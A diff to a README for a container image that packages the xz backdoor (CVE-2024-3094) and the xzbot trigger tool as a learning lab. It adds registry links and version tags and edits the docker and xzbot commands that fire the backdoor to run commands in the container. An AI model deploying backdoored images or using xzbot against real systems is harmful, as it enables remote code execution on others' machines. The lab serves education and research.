@@ -1,11 +1,20 @@
 # xz backdoor container image
 
-A container image of [xz](https://tukaani.org/xz-backdoor/) backdoor ([CVE-2024-3094](https://nvd.nist.gov/vuln/detail/CVE-2024-3094)) based on an amazing work from [@amlweems](https://github.com/amlweems)'s [xzbot](https://github.com/amlweems/xzbot) project that can be run on both *x86_64* and *Apple Silicon* (via QEMU or rosetta).
+The container image of [xz](https://tukaani.org/xz-backdoor/) backdoor ([CVE-2024-3094](https://nvd.nist.gov/vuln/detail/CVE-2024-3094)) based on an amazing work from [@amlweems](https://github.com/amlweems)'s [xzbot](https://github.com/amlweems/xzbot) project that can be run on both *x86_64* and *Apple Silicon* (via QEMU or rosetta).
 
 > THIS IS FOR LEARNING PURPOSE ONLY!
 
 ## Demo
 ![xz-backdoor demo](.github/demo.gif)
+
+## Overview
+The container images are available on both Github ([ghcr.io/rezigned/xz-backdoor](https://github.com/rezigned/xz-backdoor/pkgs/container/xz-backdoor)) and Docker ([rezigned/xz-backdoor](https://hub.docker.com/r/rezigned/xz-backdoor)) registries.
+
+### Versions
+Both versions of the xz-backdoor are available as image tags.
+
+* 5.6.0
+* 5.6.1 (`latest`)
 
 ## Getting started
 
@@ -25,7 +34,7 @@ docker run --rm -it -d \
   --privileged \
   --name xz-backdoor \
   --platform linux/amd64 \
-  ghcr.io/rezigned/xz-backdoor:latest
+  rezigned/xz-backdoor:latest # or xz-backdoor:5.6.0
 ```
 **2. Run a command via `xzbot`**
 
@@ -36,10 +45,10 @@ docker run --rm -it -d \
 
 ```sh
 # default command `id > /tmp/.xz`
-docker exec -it `docker ps -f name=xz-backdoor -q` ./xzbot -addr "127.0.0.1:22"
+docker exec -it `docker ps -f name=xz-backdoor -q` ./xzbot
 
 # custom command
-docker exec -it `docker ps -f name=xz-backdoor -q` ./xzbot -addr "127.0.0.1:22" -cmd "uname -a > /tmp/.xz"
+docker exec -it `docker ps -f name=xz-backdoor -q` ./xzbot -cmd "uname -a > /tmp/.xz"
 ```
 
 ## Acknowledgements
